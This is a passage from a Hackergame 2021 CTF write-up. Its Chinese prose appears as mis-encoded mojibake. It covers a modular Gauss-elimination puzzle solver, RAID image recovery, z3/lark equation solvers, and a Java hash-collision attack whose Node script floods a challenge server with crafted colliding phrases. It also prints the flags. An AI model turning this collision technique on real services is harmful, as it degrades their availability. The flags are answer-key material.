ä»¥åŠæ–¹ç¨‹ç»„å³ä¾§çš„å¸¸æ•°ï¼Œä½¿ä¹‹æ„é€ ä¸ºå¢å¹¿çŸ©é˜µï¼Œè€Œè¿™äº›å¸¸æ•°å°±æ˜¯æˆ‘ä»¬å°†æ‰€è¦æ±‚çš„ç›®æ ‡è¿›è¡Œä¸€ç»´åŒ–å¾—åˆ°çš„ï¼š
```py
target = np.array([
    [189] * 5 + [33] * 3 + [189] * 4,
    [189] * 3 + [33] * 3 + [189,33,44] + [189] * 3,
    [189] * 5 + [33] * 4 + [189] * 3,
    [189] * 5 + [33,189,33,33] + [189] * 3,
    [189] * 3 + [33,33,189,189,33,33,33] + [189] * 2,
    [189,134] + [33] * 2 + [189] * 4 + [33] * 2 + [189] * 2,
    [189,144] + [33] * 2 + [189] * 4 + [33] + [189] * 3,
    [189,142] + [33] * 2 + [189] * 4 + [33] * 3 + [189],
    [189,100,142,33] + [189] * 4 + [33] * 3 + [189],
    [189] + [142] * 2 + [189] * 6 + [33] + [189] * 2,
    [189,59,142,33] + [189] * 4 + [33] + [189] * 3,
    [189] * 2 + [33] * 2 + [189] * 8,
]).reshape((144))
```

ç„¶åå°±æ˜¯ç®—æ³•çš„æ ¸å¿ƒäº†ï¼Œåœ¨æ¨¡æ„ä¹‰ä¸‹çš„ `Gauss` æ¶ˆå…ƒæ³•ï¼š
```py
from Crypto.Util.number import inverse

def guess(c, d, modulus = 256):
    size = c.shape[0] # é»˜è®¤çš„è¾“å…¥ä¸ºæ–¹é˜µ
    assert(c.shape[0] == c.shape[1])
    # å°†æ–¹é˜µè½¬åŒ–ä¸ºä¸Šä¸‰è§’é˜µ
    # [x x x]    [x x x]
    # [x x x] -> [0 x x]
    # [x x x]    [0 0 x]
    for i in range(size - 1): # å¯¹äºæ¯ä¸€è¡Œ
        for j in range(i + 1, size): # å¯¹äºå®ƒä¸‹é¢çš„æ¯ä¸€è¡Œ
            while c[j][i] != 0: # å¦‚æœè¿™ä¸€è¡Œçš„ç¬¬ i åˆ—ä»ç„¶ä¸ä¸º 0
                t = c[j][i] // c[i][i] # è®¡ç®—å€ç‡
                # å› ä¸ºå­˜åœ¨äº¤æ¢ï¼Œè¾—è½¬ç›¸é™¤ï¼Œç›´è‡³ä¸€æ–¹ä¸º 0

                # æ•´è¡Œå‡å»ç¬¬ i è¡Œå¯¹åº”å€æ•°
                c[j] = (c[j] - t * c[i]) % modulus
                d[j] = (d[j] - t * d[i]) % modulus

                # äº¤æ¢ä¸¤è¡Œ
                if c[j][i] != 0:
                    c[[i, j]] = c[[j, i]]
                    d[[i, j]] = d[[j, i]]

    # ä»ä¸‹è‡³ä¸ŠæŒ‰è¡Œæ±‚è§£æ–¹ç¨‹
    for i in range(size - 1, -1 ,-1):
        # ç¬¬ i è¡Œçš„å¸¸æ•°å‡å»å®ƒä¸‹æ–¹å·²ç»æ±‚è§£å®Œæ¯•çš„æœªçŸ¥æ•°çš„çš„ç³»æ•°å€
        d[i] -= sum([(c[i][j] * d[j]) % modulus for j in range(i + 1, size)])
        d[i] %= modulus

        # å¦‚æœå¯ä»¥æ•´é™¤
        if d[i] % c[i][i] == 0:
            d[i] //= c[i][i]
        # å¦åˆ™æ±‚è§£æ¨¡æ„ä¹‰ä¸‹çš„é€†å…ƒå¹¶ç›¸ä¹˜
        else:
            d[i] *= inverse(c[i][i], modulus)
            d[i] %= modulus
    return d
```

å¦‚æ­¤å¾—åˆ°çš„ `d` ä¾¿æ˜¯æ‰€è¦æ±‚çš„ç»“æœäº†ï¼Œç”±äºå½“æ—¶æ²¡æœ‰é€†å‡ºæ¥æäº¤çš„ APIï¼Œè€Œæƒ³é€šè¿‡ js å®ç°ç‚¹å‡»åˆé‡åˆ°äº†å¾ˆå¤šå›°éš¾ï¼Œäºæ˜¯ç›´æ¥ç”¨ win32 çš„ APIå®ç°æ¨¡æ‹Ÿç‚¹å‡»çš„åŠŸèƒ½äº†ã€‚

å¦‚æœè¦ä½¿ç”¨çš„è¯ï¼Œç¬¬ä¸€æ¬¡é‡‡é›†ä¿¡æ¯æ—¶å€™å°†é¼ æ ‡æ”¾åœ¨å·¦ä¸Šè§’çš„æ–¹å—ä¸­é—´ï¼Œç¬¬äºŒæ¬¡æ”¾åœ¨å·¦ä¸Šè§’å³ç§»ä¸€ä¸ªçš„æ–¹å—ï¼Œç¨‹åºä¼šæ ¹æ®æ­¤æ•°æ®è®¡ç®—æ–¹å—åç§»é‡ï¼Œå¹¶æ¨¡æ‹Ÿç‚¹å‡»ï¼š
```py
import win32api
import win32con
import time

def click_cur(pos, times):
    win32api.SetCursorPos(pos)
    for _ in range(times):
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN|win32con.MOUSEEVENTF_LEFTUP,0,0,0,0)

def get_cur():
    print('[+] waiting...',end='')
    for i in range(5):
        time.sleep(1)
        print(5 - i,end='...')
    print()
    return win32api.GetCursorPos()

def init():
    print('[+] please place your mouse the block at (0,0) in 5s')
    origin = get_cur()
    print(f'[!] (0,0) at {origin}')
    print('[+] please place your mouse the block at (0,1) in 5s')
    now = get_cur()
    print(f'[!] (0,1) at {now}')
    step = now[0] - origin[0]
    return origin, step

origin, step = init()
ans = ans.reshape((12,12))
for i in range(12):
    for j in range(12):
        click_cur((origin[0] + step * j, origin[1] + step * i), ans[i][j])
        time.sleep(0.1)
```

è¾“å…¥åå¾—åˆ° flagï¼š

**flag{Lights_are_Linear_0ae7af96f3b90954}**

## é˜µåˆ—æ¢å¤å¤§å¸ˆ

### raid5

è¿™é“é¢˜ raid5 æœ¬è´¨ä¸Šæ¯” raid0 æ›´åŠ ç®€å•ï¼Œè¯´èµ·æ¥çœŸæ­£å¯¹é˜µåˆ—æœ‰è¿›ä¸€æ­¥çš„äº†è§£è¿˜æ˜¯å› ä¸ºå®éªŒå®¤ sas æœåŠ¡å™¨å› ä¸ºç”µæºé—®é¢˜å¼‚å¸¸æ–­ç”µï¼Œå¯¼è‡´å…«ä¸ªç¡¬ç›˜ä¸­çš„ä¸€ä¸ªä¸æ­£å¸¸ï¼Œé€ æˆäº†ä¸å°çš„éº»çƒ¦ã€‚è™½ç„¶æ²¡æœ‰ç€æ‰‹è§£å†³ï¼Œä½†ä¹Ÿå¯¹ raid5 æœ‰äº†äº›æ›´åŠ å¥½çš„ç†è§£ã€‚ä¸è¿‡ä¹Ÿå› æ­¤ï¼Œä¸€ç›´ä½¿ç”¨çš„é•œåƒç«™æŒ‚äº†ï¼Œæ¢æºä¹‹åå¼€å§‹æ€€å¿µæ ¡å†…çš„åƒå…†é•œåƒäº†â€¦â€¦

ä½¿ç”¨ `file *.img` å¯ä»¥å¾ˆå¿«åœ°çœ‹å‡ºæ¥ç¡¬ç›˜çš„åŸºæœ¬ä¿¡æ¯ï¼š

```bash
$ file *.img
3D8qN9DH91Q.img: data
3RlmViivyG8.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
60kE0MQisyY.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
IrYp6co7Gos.img: data
QjTgmgmwXAM.img: data
```

å› æ­¤ï¼Œç”±äº raid5 çš„ç‰¹æ€§ï¼Œç¬¬ä¸€å—å’Œç¬¬äº”å—ç›˜ä¹Ÿå°±ç¡®å®šäº†ï¼Œå‰©ä¸‹çš„å¯èƒ½æ€§ä¸€å…± 12 ç§ï¼Œç¨ä½œå®éªŒï¼Œç”¨ diskgenius æ‰“å¼€ï¼Œé€‰æ‹©ç»„å»ºè™šæ‹Ÿraidï¼Œä¾æ¬¡è°ƒæ•´é¡ºåºï¼Œå°±å¯ä»¥å¾—åˆ°æƒ³è¦çš„ç»“æœäº†ã€‚

![](https://cdn.gztime.cc/hg2021/disk1.jpg)

![](https://cdn.gztime.cc/hg2021/disk0.jpg)

åªéœ€å°†å…¶å¯¼å‡ºä¸º img é•œåƒï¼Œå¹¶ä¸”ä½¿ç”¨ linux ç³»ç»ŸæŒ‚è½½ï¼Œæ ¹ç›®å½•æ‰§è¡Œ `getflag.py` å³å¯ã€‚å¬è¯´æœ‰ä¸å°‘äººå¡åœ¨äº†è¿™é‡Œï¼Œæ¯•ç«Ÿ linux å’Œ windows çš„ç›®å½•åˆ†éš”ç¬¦å·å¯èƒ½ä¸ä¸€æ ·å•Šï¼ˆé€ƒ

**flag{a18325a1ec0f58292908455c2df8ffcd}**

### raid0

ç”¨åŒæ ·çš„æ–¹æ³•ç¡®è®¤ä¸€ä¸‹ç¬¬ä¸€å—ç›˜ï¼š

```bash
file *.img
1GHGGrmaMM0.img: data
5qiSQnlrA4Y.img: data
ID7sM2RWkyI.img: data
RApjvIxRlu0.img: data
d3Be7V0EVKo.img: data
eRL2MQSdOjo.img: data
jCC60mutgoE.img: data
wlOUASom2fI.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 262143 sectors, extended partition table (last)
```

raid0 æ˜¯çº¯ç²¹æŠŠæ•°æ®åˆ†å¸ƒå¼å­˜å‚¨äº†ï¼ŒåŒæ—¶ç›´æ¥ä½¿ç”¨ 010 Editor æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥å‘ç°å—å¤§å°æ˜¯ 128KBï¼Œäººè‚‰æœç´¢å‡ å—çš„è¿ç»­æ•°æ®å—ï¼Œå¯ä»¥å¾—åˆ°å¯¹åº”çš„åºåˆ—ï¼Œç„¶è€Œåœ¨ diskgenius ä¸­å¹¶çœ‹ä¸åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œå†å®šç›ä¸€çœ‹æ‰å‘ç°æ˜¯ xfsï¼Œwindows å’Œ diskgenius éƒ½ä¸æ”¯æŒã€‚

å°†å…¶æ•´ä¸ªç£ç›˜å…‹éš†åˆ°æ–°çš„è™šæ‹Ÿç£ç›˜å†…ï¼Œè€Œåå°±èƒ½å°†å…¶æ‹–å…¥ ubuntu è™šæ‹Ÿæœºï¼Œç›´æ¥å¯ä»¥æ‰“å¼€ã€‚

![](https://cdn.gztime.cc/hg2021/disk2.jpg)

äºæ˜¯è¿è¡Œï¼Œå¾—åˆ°ç»“æœï¼š

**flag{4857cdeac07d8456fcaedb61d07b0b7d}**

## åŠ©è®°è¯

### ç¬¬ä¸€é¡¿å¤§é¤

é¦–å…ˆçœ‹çœ‹ä»£ç ï¼Œå‘ç°äº†å»¶æ—¶é—´ä¸»è¦æ˜¯å› ä¸ºåœ¨ `equals` å‡½æ•°ä¸­å­˜åœ¨ `sleep` æ“ä½œï¼š
```java
@Override
public boolean equals(Object o)
{
    if (o instanceof Phrase that)
    {
        try
        {
            TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); // TODO: remove it since it is for debugging
        }
        catch (InterruptedException e)
        {
            throw new RuntimeException(e);
        }
        return that.text.equals(this.text) && that.time.equals(this.time) && that.user.equals(this.user);
    }
    return false;
}

@Override
public int hashCode()
{
    return Objects.hash(this.text, this.time, this.user);
}
```

åœ¨ `LinkedHashSet` ä¸­ï¼Œæ’å…¥æ—¶ä¼šå…ˆè¡Œè®¡ç®— `hashCode` å¦‚æœ `hashCode` ç›¸åŒï¼Œåˆ™ä¾æ¬¡æ²¿ç€é“¾è¡¨è¿›è¡Œ `equals` æ¯”è¾ƒï¼Œå¦‚æœå‡ä¸åŒ¹é…åˆ™æ’å…¥é“¾è¡¨å°¾éƒ¨ï¼Œå¦åˆ™ä¸æ’å…¥ã€‚

è¿™é“é¢˜çš„ç¬¬ä¸€é—®å¾ˆç®€å•ï¼Œåªéœ€è¦å»¶è¿Ÿ 600msï¼Œç›´æ¥æƒ³åˆ°ç”¨å®Œå…¨ä¸€æ ·çš„å­—ç¬¦ä¸²è¿›è¡Œå“ˆå¸Œç¢°æ’ï¼Œäºæ˜¯ç¬¬ä¸€å…³çš„ `payload` ä¹Ÿå°±æ˜¯ä¸€ä¸ªé‡å¤äº† 32 éçš„åŒä¸€æ¡çŸ­è¯­äº†ã€‚

**flag{h45h-m4p-c011i5i0n-0f-key-inpu75-2d575b13bd6194a2}**

### ç¬¬äºŒé¡¿å¤§é¤

è€Œå¯¹äºç¬¬äºŒé—®ï¼Œç¬¬ä¸€é—®çš„åŒæ„å­—ç¬¦ä¸²ä¸€å®šè¡Œä¸é€šäº†ï¼Œæ€è·¯ä¸Šè§‰å¾—ä¸€å®šæ˜¯éœ€è¦åšå“ˆå¸Œç¢°æ’äº†ï¼Œå…ˆçœ‹çœ‹ `Java` çš„å­—ç¬¦ä¸²å“ˆå¸Œä»¥åŠ `Objects.hash` çš„ç›¸å…³å®ç°ï¼š

```java
public int hashCode() {
    int h = hash;
    if (h == 0 && value.length > 0) {
        char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}
```

`Objects.hash` çš„å®ç°ä¹ŸåŒç†ï¼Œåªæ˜¯å°†æ•°ç»„ä¸­å…ƒç´ çš„å“ˆå¸Œåšç›¸ä¼¼çš„å¤„ç†ï¼Œè¿™é‡Œå°±ä¸æ”¾å‡ºäº†ã€‚ä¸è¿‡ä¸æœä¸çŸ¥é“ï¼Œä¸€æœå“ä¸€è·³ã€‚è¿™ä¸€å­—ç¬¦ä¸²çš„å“ˆå¸Œç®—æ³•é¥±å—è¯Ÿç—…ï¼Œç¢°æ’æå…¶å®¹æ˜“ï¼Œç”šè‡³åˆä¸€ä¹‹åæ„é€ éƒ½å¾ˆç®€å•ã€‚è€Œæ—¶é—´çš„å“ˆå¸Œå¯ä»¥è°ƒè¯•ä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°å°±æ˜¯æ—¶é—´æˆ³ï¼Œæ¯ç§’è‡ªå¢ 1ï¼Œäºæ˜¯ç›¸å½“äºæˆ‘ä»¬éœ€è¦å‡†å¤‡åç§’å†…å“ˆå¸Œè®¡ç®—ç»“æœç›¸åŒçš„ä¸€ç»„æ•°æ®ã€‚äºæ˜¯å‡†å¤‡ç©·ä¸¾äº†ï¼Œ`python` çš„æ•ˆç‡ä¸æ•¢æ­ç»´ï¼Œå¹²è„†ç”¨ `cpp` å†™äº†ä¸ªå¤šçº¿ç¨‹ï¼Œæ‰”åˆ°æœåŠ¡å™¨å»è·‘ã€‚

å¦‚æœä»¤å¼€å§‹æ—¶é—´æ˜¯ `t`ï¼Œåˆ™æˆ‘ä»¬å¸Œæœ›åœ¨æœªæ¥ä¸€æ®µæ—¶é—´å†…æ„é€  `m, n, ..., p` ä½¿å¾—æ»¡è¶³ï¼š
```
m * 31 + t == n * 31 + t + 1 == ... == p * 31 + t + 9
```

æˆ‘çš„ä»£ç å®ç°å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts/%E5%8A%A9%E8%AE%B0%E8%AF%8D)ï¼Œç»“æŸåçœ‹åˆ° `mcfx` çš„[ä»£ç ](https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/#%E5%8A%A9%E8%AE%B0%E8%AF%8D)æ„è¯†åˆ°è¿™é‡Œé¢å¤šäº†å¤ªå¤šæ— ç”¨çš„è¿ç®—ï¼Œä¸è¿‡ç®—æ³•çƒ‚æœºå™¨å‡‘ï¼Œç›´æ¥ä»å®éªŒå®¤ PVE å¼€äº†ä¸ªè™šæ‹Ÿæœºï¼Œè·‘ä¸ªä¸‰å››åçº¿ç¨‹è¿˜æ˜¯å¾ˆå¿«çš„ï¼ˆé€ƒ

è™½ç„¶æ²¡æœ‰ä¸¥è°¨è®¡ç®—ï¼Œä½†ä¼°ç®—å¯çŸ¥ç¬¬ä¸€ç§’å†…èƒ½æäº¤çš„æ•°é‡ä¸€å®šæ¯”è¾ƒå¤šï¼Œè€Œåçš„å‡ ç§’é’Ÿå› ä¸ºéœ€è¦ä¸ä¹‹å‰å…¨éƒ¨çš„å…ƒç´ è¿›è¡Œ `equals` æ“ä½œï¼Œå› æ­¤æ•°é‡è¾ƒå°‘ï¼Œæ‰‹åŠ¨åœ¨æœ¬åœ°è°ƒæ•´å¥½æ•°é‡ä¹‹åã€éªŒè¯é€šè¿‡ä¹‹åï¼Œå‡†å¤‡å‘ç»™æœåŠ¡å™¨ã€‚

ç”±äºç½‘ç»œå»¶æ—¶ç­‰å› ç´ ï¼Œå‘ç»™æœåŠ¡å™¨çš„æ—¶é—´ä¼šå½±å“åˆ°æˆ‘ä»¬æ•°æ®çš„è§£æï¼Œå¦‚æœæŸä¸€ä¸ªæ²¡æœ‰åœ¨åˆé€‚çš„æ—¶é—´è¢«è®¡ç®—ï¼Œå°±ä¼šå¯¼è‡´åé¢çš„å…¨éƒ¨å¤±è´¥ï¼Œå› æ­¤è¿™åˆæ˜¯é“æŠ½å¥–é¢˜â€¦â€¦(â•¬â–”çš¿â–”)â•¯

å› ä¸ºæ¯”è¾ƒéï¼Œæœ¬äººç­‰äº†å¾ˆä¹…ï¼ˆ

æœ€åçš„è§£é¢˜è„šæœ¬ï¼Œå¦‚æœè¯´ä¸ºä»€ä¹ˆçªç„¶ç”¨ `js`ï¼Œé‚£å°±æ˜¯æœ€å¼€å§‹ä»¥ä¸ºè¦æå¤šå¹¶å‘â€¦â€¦æ‰€ä»¥ç›´æ¥ä¸Š `axios` äº†ï¼ˆé€ƒ

```js
const axios = require('axios');

const debug = false;

let token_param = '?token=your_token'

let url = 'http://202.38.93.111:10048/phrases'

if(debug) url = 'http://localhost:8080/phrases'

axios({
    method: 'delete',
    url: debug ? url : url + token_param,
}).then(res => console.log(res.data));

function dotest(data_) {
    setTimeout(() => {
        start = Date.now()
        console.log(start)
        axios({
            method: 'post',
            url: debug ? url : url + token_param,
            data: data_,
            headers: {
                'Content-Type': 'application/json',
            }
        }).then(res => {
            console.log(res.data);
            let diff = Date.now() - start;
            console.log(diff);
            if(!res.data.flag2)
            axios({
                method: 'delete',
                url: debug ? url : url + token_param,
            }).then(_ => dotest(data1));
        })
        .catch(err => console.log(err.data));
    }, (parseInt(Date.now()/1000) + 1) * 1000 - Math.random() * 500 - Date.now());
}

data1 = '['

// 681972554 0
data += '"anything text drive bottom", "author basis instance inflation", "category scene paper fact", "charge spot being finding", "company page dealer product", "competition county garden couple", "demand choice skill support", "department safety hold wait", "desire line model green", '
// 681972553 1
data += '"data model temperature fail", "activity gift science inside", "black black writing beginning", "brown demand ground number", '
// 681972552 2
data += '"animal complex rent visit", "anything check government while", "design effect decision context", '
// 681972551 3
data += '"amount credit pair game", "benefit attention user press", '
// 681972550 4
data += '"appearance savings boat turn", "pair face task bank", '
// 681972549 5
data += '"anything advantage broad reading", "area board tonight reference", '
// 681972548 6
data += '"apartment room pressure produce", "charge advice kind deal", '
// 681972547 7
data += '"attention army heart cell", "benefit beginning form alternative", '
// 681972546 8
data += '"account training community minute", "advertising move average shopping", '
// 681972545 9
data += '"beyond display visit course", "camera individual active government", "function president history common"'
data += ']'


dotest(data)
```

**flag{differen7-key5-h45h-m4p-c011i5i0n-c1a632ea5e992158}**

## Co-Program

### Co-Login

ä¸€çœ‹åˆ°è§£æ–¹ç¨‹æˆ‘å°±æƒ³åˆ°äº†å¾®è½¯çš„å¼€æºæ±‚è§£å™¨ â€”â€” `z3` (ä»€ä¹ˆæ˜¯[z3](https://github.com/Z3Prover/z3)), ä½†æ˜¯ä¸€ç›´è‹¦äºæ€ä¹ˆæŠŠæ–°çš„è¿ç®—å®šä¹‰è¿›å»ï¼Œä¹Ÿæ²¡æƒ³å¥½å˜é‡æ€ä¹ˆå®šä¹‰ï¼Œèµ°æŠ•æ— è·¯çš„æ—¶å€™æƒ³èµ·æ¥ä¹‹å‰ TCTF ç”¨åˆ°çš„ parser åº“ `lark`ï¼Œä¾¿æƒ³ç€ç”¨å®ƒæ¥ç­›é€‰ç¬¦å·å’Œç¡®å®šä¼˜å…ˆçº§ï¼Œæ²¡æƒ³åˆ°è¿™ä¸‹å¯å¥½ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼ŒäºŒè€…ç»“åˆï¼Œé€šè¿‡å®šä¹‰ `Transformer` çš„æ–¹å¼è§£å†³æˆ‘æ‰€æœ‰çš„é—®é¢˜ï¼Œå¹¶ä¸”è¿˜ååˆ†æ–¹ä¾¿ã€‚

äºæ˜¯æˆ‘å‡†å¤‡åœ¨è¿™é‡Œè¯¦ç»†è®²è®²æœ‰å…³äºä»–ä»¬çš„åŸºæœ¬ç”¨æ³•å’Œæ€ä¹ˆç»“åˆä»–ä»¬æ¥è¿›è¡Œè¿™é“é¢˜ç›®çš„è¿ç®—ã€‚

ä» `z3` è®²èµ·ï¼Œè¿™æœ‰ä¸€ä¸ªååˆ†ç®€å•çš„ä¾‹å­ï¼š
```py
>>> from z3 import *
>>> a = Int('a')
>>> b = Int('b')
>>> solve(a + b == 5, a > 8)
[b = -4, a = 9]
```

ç®€å•æ¥è¯´ï¼Œåªè¦ç»™å®šé€‚å½“çš„çº¦æŸï¼Œ`z3`ä¾¿å¯ä»¥å°†å…¶æ±‚è§£å‡ºæ¥ã€‚å…¶ä¸­çš„ `BitVec` å¯ä»¥ä½œä¸ºç›´æ¥çš„å®šä¹‰è¿™ä¸€æ•´æ•°æ˜¯å¤šå°‘ä½çš„ï¼Œå› æ­¤å¯¹äºè¿™é“é¢˜æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ 36 bit çš„ `BitVec`ï¼Œè€Œå¯¹äºæœ‰ç¬¦å·å’Œæ— ç¬¦å·è¿ç®—ï¼Œ`z3`ä¹Ÿç»™å‡ºäº†ä¸€å¥—çš„å‡½æ•°å¯ä¾›é€‰æ‹©ï¼Œè¯¦è§[è¿™é‡Œ](https://z3prover.github.io/api/html/namespacez3py.html)ã€‚

ä¹‹åï¼Œæˆ‘ä»¬æ¥èŠèŠ `lark` æ˜¯ä»€ä¹ˆã€‚å¦‚æœä½ ä¸çŸ¥é“ `parser` æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å…ˆå‚è€ƒæˆ‘[è¿™ç¯‡åšå®¢](https://blog.gztime.cc/posts/2021/a5656446/)ã€‚æ€»ä¹‹ï¼Œ`lark`æä¾›äº†ä¸€ç§æ–¹ä¾¿çš„æ–¹æ³•ï¼Œèƒ½å¤Ÿè¿›è¡Œè‡ªå®šä¹‰çš„è¯­æ³•è§£æä»¥åŠè®¡ç®—ï¼Œå¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è¯­æ³•ï¼š
```lark
?start: sum

?sum: product
    | sum "+" product   -> add
    | sum "-" product   -> sub

?product: atom
    | product "*" atom  -> mul
    | product "/" atom  -> div
    | product "%" atom  -> mod

?atom: NAME             -> var
    | "-" atom          -> neg
    | "(" sum ")"

%import common.CNAME -> NAME
%import common.NUMBER
%import common.WS_INLINE
%ignore WS_INLINE
```

å¯ä»¥åœ¨ä¸Šè¿°åšå®¢ä¸­æ‰¾åˆ°æ›´è¯¦ç»†çš„æœ‰å…³äºè¿™ä¸€ä¼˜å…ˆçº§çš„å®šä¹‰çš„å†…å®¹ï¼Œè¿™é‡Œç•¥è¿‡ã€‚åœ¨å¾—åˆ°è¯­æ³•ç»“æ„ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰`Transformer`æ¥å°†è¯­æ³•æ ‘åˆå¹¶ä¸ºæˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œè€Œåœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å°†é¢˜ç›®çš„è®¾å®šåŠ å…¥ï¼Œç»´æŠ¤å˜é‡å­—å…¸ï¼Œå¹¶é™åˆ¶ä¸ºæ— ç¬¦å·è®¡ç®—ã€‚

```py
@v_args(inline=True)
class Convertor(Transformer):
    from operator import add, sub, mul, neg

    # å®šä¹‰æ¨¡æ„ä¹‰ä¸‹çš„æ— ç¬¦å·é™¤æ³•ï¼Œå¹¶å¯¹é™¤æ•°ä¸º 0 è¿›è¡Œå¤„ç†
    def div(self, a, b):
        return If(b == 0, BOUNDRY, UDiv(a, b))

    # å®šä¹‰æ¨¡æ„ä¹‰ä¸‹çš„æ— ç¬¦å·å–æ¨¡ï¼Œå¹¶å¯¹é™¤æ•°ä¸º 0 è¿›è¡Œå¤„ç†
    def mod(self, a, b):
        return If(b == 0, a, URem(a, b))

    def __init__(self):
        self.vars = {}

    def var(self, name):
        if name[0] not in self.vars.keys():
            self.vars[name[0]] = BitVec(name, 36)
        return self.vars[name[0]]
```

æœ‰ä»¥ä¸Šçš„åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡**è¯­æ³•æ ‘çš„è§£æ**ã€**å˜é‡å­—å…¸çš„ç»´æŠ¤**ã€**è¯­æ³•æ ‘åˆå¹¶çš„è¿ç®—ç¬¦è‡ªå®šä¹‰**æ¥åšåˆ°æˆ‘ä»¬éœ€è¦è¾¾æˆçš„å…¨éƒ¨æ“ä½œäº†ã€‚

å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š
```py
from z3 import *
from lark import Lark, Transformer, v_args
from pwn import *
from tqdm import tqdm

# context.log_level = 'debug'

token = b'your token here'

BOUNDRY = 2 ** 36 - 1

# å®šä¹‰è§£æå™¨è¯­æ³•
GRAM = '''?start: sum

?sum: product
    | sum "+" product   -> add
    | sum "-" product   -> sub

?product: atom
    | product "*" atom  -> mul
    | product "/" atom  -> div
    | product "%" atom  -> mod

?atom: NAME             -> var
    | "-" atom          -> neg
    | "(" sum ")"

%import common.CNAME -> NAME
%import common.NUMBER
%import common.WS_INLINE
%ignore WS_INLINE'''

# åˆå§‹åŒ–è¿æ¥
def init_conn(token):
    io = remote('202.38.93.111', 10700)
    io.sendlineafter(b'token: ', token)
    io.recvline()
    return io

# è·å–å½“å‰é¢˜ç›®
def get_problem():
    expr = io.recvline().decode().strip()
    ans = int(io.recvline().decode().strip())
    return expr, ans

# å›ç­”é¢˜ç›®
def answer_problem(vars_):
    io.sendline(' '.join(f'{i[0]}={i[1] if i[1] is not None else 0}' for i in vars_).encode())

# è½¬æ¢å™¨
@v_args(inline=True)
class Convertor(Transformer):
    from operator import add, sub, mul, neg

    def div(self, a, b):
        return If(b == 0, BOUNDRY, UDiv(a, b))

    def mod(self, a, b):
        return If(b == 0, a, URem(a, b))

    def __init__(self):
        self.vars = {}

    def var(self, name):
        if name[0] not in self.vars.keys():
            self.vars[name[0]] = BitVec(name, 36)
        return self.vars[name[0]]

# åˆå§‹åŒ–è§£æå™¨
def init_parser(convertor):
    return Lark(GRAM, parser='lalr', transformer=convertor)

# å°† z3 çš„ç»“æœçš„ model è¿”å›
def solve_with_return(*args, **keywords):
    so = Solver()
    so.set(**keywords)
    so.add(*args)
    r = so.check()
    if r == unsat:
        return None
    elif r == unknown:
        try:
            return so.model()
        except Z3Exception:
            return None
    else:
        return so.model()

if __name__ == '__main__':
    convertor = Convertor()
    parse = init_parser(convertor).parse
    io = init_conn(token)

    for _ in tqdm(range(100)):
        expr, ans = get_problem()
        try:
            question = parse(expr) # è§£æè¡¨è¾¾å¼ä¸º z3 çš„æ ¼å¼
            result = solve_with_return(question == ans) # ä¼ é€’ç»™ z3 è¿›è¡Œæ±‚è§£

            if result is None:
                raise TypeError

            to_send = []
            for name in convertor.vars.keys():
                to_send.append([name, result[convertor.vars[name]]])

            answer_problem(to_send)
        except:
            io.sendline()
        finally:
            convertor.vars.clear()

    print(io.recvall())
```

è‡³æ­¤ï¼Œé¢˜ç›®å®Œæˆã€‚

(z3 nb!!!

**flag{z3isgood!-a4dd6de004}**

### Co-UnitTest

è¿™é“é¢˜æœ€å¼€å§‹æ˜¯å¾ˆç•æƒ§çš„ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆå†™ï¼Œæ„Ÿè§‰ä¼šå¾ˆéš¾ã€‚åˆ°æœ€åä¸€å¤©å¹²è„†å‡†å¤‡èººå¹³ï¼Œä½†æ˜¯çœ‹ç€è¿™ä¸ªè¡¨è¾¾å¼å¦‚æ­¤å¾—æœ‰è§„å¾‹ï¼Œè¯´ä¸å®šå¯ä»¥åœ¨æ›´å¤šçš„é™å®šä¹‹ä¸‹å°†å…¶åšå‡ºæ¥ï¼Œäºæ˜¯åšäº†å¦‚ä¸‹çš„å·¥ä½œï¼š

å†™äº†ä¸ªè§£æå™¨ç”Ÿæˆå™¨ï¼Œå› ä¸ºè€ƒè™‘åˆ°è¿™é‡Œé¢åµŒå¥—çš„è¡¨è¾¾å¼æ— å¤–ä¹ä¸¤ä¸‰å±‚çš„ç¬¦å·çš„æ‹¼æ¥ï¼Œäºæ˜¯ï¼š
```py
operations = ['-', '+', '*', '/', '%']

def gen_expr(depth = 0, use_single = True):
    for item in ['x', 'y']:
        yield item

    if depth == 2:
        return

    for op in operations:
        for lval in gen_expr(depth + 1):
            for rval in gen_expr(depth + 1):
                if lval == rval and op == '-': # avoid zero
                    continue
                yield f'({lval}{op}{rval})'
```

å®šä¹‰ä¸€ä¸ªåˆé€‚çš„æ•°å€¼è®¡ç®—çš„`Transformer`ï¼š
```py
BOUNDRY = 2 ** 36

@v_args(inline=True)
class Convertor(Transformer):
    def neg(self, a):
        return (-a) % BOUNDRY

    def mul(self, a, b):
        return (a * b) % BOUNDRY

    def sub(self, a, b):
        return (a - b) % BOUNDRY

    def add(self, a, b):
